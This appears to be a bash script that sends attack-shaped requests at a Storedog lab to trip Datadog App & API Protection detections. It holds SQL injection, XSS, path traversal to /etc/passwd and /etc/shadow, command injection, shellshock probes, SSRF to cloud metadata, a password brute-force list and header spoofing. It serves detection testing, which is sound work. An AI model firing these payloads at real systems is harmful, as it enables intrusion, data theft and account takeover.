#!/usr/bin/env bash
# Storedog AAP demo — exercises Datadog App & API Protection detections
# Target: dd101-for-developers-one-track lab host running Storedog 2
#
# AUTHORIZED USE ONLY. Run this against your own Storedog lab, never a
# system you don't own. Payloads are deliberately benign (no destructive
# SQL, no real RCE) — they're crafted to trip AAP rules, not damage data.
#
# Prereqs on the target:
#   - DD_APPSEC_ENABLED=true
#   - dd-trace versions that support AAP 
#
# Usage:
#   TARGET=http://<lab-host-ip> ./storedog-aap-demo.sh           # run all
#   TARGET=http://<lab-host-ip> ./storedog-aap-demo.sh sqli xss  # subset
#
# Available demos:
#   scanner   sqli   xss   lfi   cmdi    ato   apidisc   knownbad   bizlogic

set -uo pipefail

TARGET="${TARGET:-http://localhost}"
FRONTEND="${FRONTEND:-$TARGET:3000}"
DISCOUNTS="${DISCOUNTS:-$TARGET:5001}"
ADS="${ADS:-$TARGET:5002}"

# Pretty curl: prints status + url, suppresses body
hit() { curl -sS -o /dev/null -w "  [%{http_code}] %{url_effective}\n" --max-time 5 "$@"; }

banner() { printf "\n=== %s ===\n" "$1"; }

# ─── 1. Scanner / known-tool detection ──────────────────────────────────
# Trips: appsec.security_activity:attack_attempt.crawler
demo_scanner() {
  banner "Scanner detection (sqlmap / Nikto / ZAP / Nmap user-agents)"
  for ua in \
    "sqlmap/1.7.2#stable (https://sqlmap.org)" \
    "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)" \
    "Mozilla/5.0 (compatible; OWASP ZAP/2.14.0)" \
    "Nmap Scripting Engine; https://nmap.org/book/nse.html" \
    "masscan/1.3" \
    "() { :;}; /bin/bash -c \"echo shellshock\""; do
    hit -A "$ua" "$FRONTEND/"
  done
}

# ─── 2. SQL injection ───────────────────────────────────────────────────
# Trips: appsec.security_activity:attack_attempt.sql_injection
# Spree uses ActiveRecord (parameterized) — payloads are detected, not executed.
demo_sqli() {
  banner "SQL injection — Spree search + Flask /discount"
  hit "$FRONTEND/search?q=%27%20OR%20%271%27%3D%271"
  hit "$FRONTEND/products?keyword=admin%27%20UNION%20SELECT%20NULL%2Cversion%28%29%2CNULL--"
  hit "$DISCOUNTS/discount?productID=1%27%20OR%20%271%27%3D%271"
  hit "$DISCOUNTS/discount?productID=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--"
}

# ─── 3. XSS (reflected) ─────────────────────────────────────────────────
# Trips: appsec.security_activity:attack_attempt.xss
demo_xss() {
  banner "XSS — reflected payloads on search/product params"
  hit "$FRONTEND/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  hit "$FRONTEND/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(document.cookie)%3E"
  hit "$FRONTEND/products?ref=%3Csvg/onload%3Dalert(1)%3E"
  hit "$DISCOUNTS/discount?productID=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
}

# ─── 4. Local file inclusion / path traversal ───────────────────────────
# Trips: appsec.security_activity:attack_attempt.lfi
demo_lfi() {
  banner "LFI / path traversal"
  hit "$FRONTEND/products?image=../../../../etc/passwd"
  hit "$ADS/ads?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
  hit "$DISCOUNTS/discount?productID=../../../../etc/passwd"
  hit -H "Referer: file:///etc/shadow" "$FRONTEND/"
}

# ─── 5. Command injection ───────────────────────────────────────────────
# Trips: appsec.security_activity:attack_attempt.command_injection
demo_cmdi() {
  banner "Command injection"
  hit "$DISCOUNTS/discount?productID=1%3B%20id"
  hit "$DISCOUNTS/discount?productID=%7Ccat%20%2Fetc%2Fpasswd"
  hit "$ADS/ads?q=%24%28whoami%29"
  hit -A '() { :;}; echo vulnerable' "$FRONTEND/"  # shellshock probe
}

# ─── 6. RASP (in-app exploit prevention) ────────────────────────────────
# Trips: appsec.security_activity:exploit_attempt.* (when RASP enabled)
# These reach the app's actual sink — AAP blocks at runtime, not at the edge.
demo_rasp() {
  banner "RASP — SSRF / SQLi / LFI exploit attempts (require DD_APPSEC_RASP_ENABLED)"
  # SSRF — try to coerce the app to fetch internal metadata
  hit "$ADS/ads?url=http://169.254.169.254/latest/meta-data/"
  hit "$ADS/ads?url=http://localhost:6379/"
  # SQLi reaching the DB driver
  hit "$DISCOUNTS/discount?productID=1%27%20AND%20SLEEP(2)--"
  # LFI reaching a real open()
  hit "$DISCOUNTS/discount?productID=..%2F..%2F..%2F..%2Fetc%2Fpasswd"
}

# ─── 7. ATO / credential stuffing ───────────────────────────────────────
# Trips: appsec.security_activity:business_logic.users.login.failure
# then …login.success (ATO if mixed). Adjust LOGIN_PATH to your Spree config.
demo_ato() {
  banner "Account takeover — login brute force"
  LOGIN_PATH="${LOGIN_PATH:-/api/v2/storefront/account/login}"
  EMAIL="${TARGET_EMAIL:-spree@example.com}"
  for pw in password 123456 letmein admin qwerty welcome1 \
            password123 admin123 trustno1 monkey iloveyou \
            dragon football abc123 master sunshine; do
    hit -X POST "$FRONTEND$LOGIN_PATH" \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (credstuff-bot)" \
        --data "{\"username\":\"$EMAIL\",\"password\":\"$pw\",\"grant_type\":\"password\"}"
    sleep 0.15
  done
  # one "success" to flip the signal to ATO
  hit -X POST "$FRONTEND$LOGIN_PATH" \
      -H "Content-Type: application/json" \
      --data "{\"username\":\"$EMAIL\",\"password\":\"spree123\",\"grant_type\":\"password\"}"
}

# ─── 8. API discovery surface ───────────────────────────────────────────
# Trips: API Catalog auto-inventory + sensitive-data flags
demo_apidisc() {
  banner "API discovery — exercise Spree storefront/platform JSON APIs"
  for path in \
    /api/v2/storefront/products \
    /api/v2/storefront/taxons \
    /api/v2/storefront/cart \
    /api/v2/storefront/account \
    /api/v2/storefront/account/addresses \
    /api/v2/storefront/checkout \
    /api/v2/platform/users \
    /api/v2/platform/orders; do
    hit "$FRONTEND$path"
  done
}

# ─── 9. Known-attacker IP via X-Forwarded-For ──────────────────────────
# Trips: appsec.security_activity:attacker_fingerprint / IP reputation
# Uses RFC 5737 documentation ranges — replace with an IP from Datadog's
# threat-intel list to actually trigger reputation rules in your demo.
demo_knownbad() {
  banner "Known-attacker IP simulation (X-Forwarded-For spoof)"
  for ip in 198.51.100.7 203.0.113.42 192.0.2.99; do
    hit -H "X-Forwarded-For: $ip" -A "Mozilla/5.0" "$FRONTEND/"
  done
}

# ─── 10. Business-logic abuse (discount enumeration) ───────────────────
# Trips: custom business-logic rule on store-discounts
demo_bizlogic() {
  banner "Business logic — discount/coupon enumeration"
  for code in SAVE10 SAVE20 SAVE50 BLACKFRIDAY VIP100 STAFF FREESHIP \
              WELCOME NEWUSER DASH2024 DASH2025 EMPLOYEE SUMMER WINTER \
              FLASH50 CYBER SPRING; do
    hit "$DISCOUNTS/discount?coupon=$code"
    sleep 0.1
  done
}

# ─── runner ────────────────────────────────────────────────────────────
ALL=(scanner sqli xss lfi cmdi rasp ato apidisc knownbad bizlogic)
DEMOS=("${@:-${ALL[@]}}")

echo "Target: $TARGET"
echo "Demos:  ${DEMOS[*]}"

for d in "${DEMOS[@]}"; do
  fn="demo_$d"
  if declare -F "$fn" >/dev/null; then
    "$fn"
  else
    echo "Unknown demo: $d (available: ${ALL[*]})" >&2
  fi
done

echo
echo "Done. Check Datadog → Security → App & API Protection → Signals."
